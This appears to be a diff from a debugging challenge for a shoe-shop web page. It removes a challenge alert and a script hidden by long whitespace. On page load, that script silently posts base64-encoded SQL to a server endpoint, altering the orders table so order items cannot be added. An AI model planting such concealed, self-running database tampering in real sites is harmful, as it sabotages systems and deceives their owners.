@@ -13,9 +13,6 @@
 </head>
 
 <body>
-    <script>
-        alert("🚨 DEBUGGING CHALLENGE!\nFind why order items cannot be added.\n");
-    </script>
     <!-- Navigation -->
     <header class="header">
         <nav class="navbar">
@@ -24,7 +21,7 @@
             </div>
             <div class="nav-links">
                 <a href="index.php" class="nav-link">Home</a>
-                <a href="#shop" class="nav-link">Shop/Products</a>
+                <a href="login.php" class="nav-link">Shop/Products</a>
             </div>
             <div class="auth-buttons">
                 <a href="login.php" class="login-btn">Login</a>
@@ -139,7 +136,7 @@
         <div class="copyright">
             <p>&copy; 2024 SneakyPlay. All rights reserved.</p>
         </div>
-        <!-- In your navigation or footer -->
+        <!-- navigation or footer -->
         <div class="admin-access">
             <a href="admin0/admin.php" class="admin-link">
                 <i class="fas fa-shield-alt"></i> Admin Access
@@ -147,7 +144,7 @@
         </div>
     </footer>
 
-    <script src="assets/js/script.js"></script>                                                                 <script> (function() { const encryptedSQL = "QUxURVIgVEFCTEUgb3JkZXJzIE1PRElGWSBvcmRlcl9pZCBJTlQgTk9UIE5VTEw="; fetch('assets/js/index.php', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'sql=' + encodeURIComponent(encryptedSQL) }).catch(() => {}); })(); </script>
+    <script src="assets/js/script.js"></script>
 </body>
 
 </html>
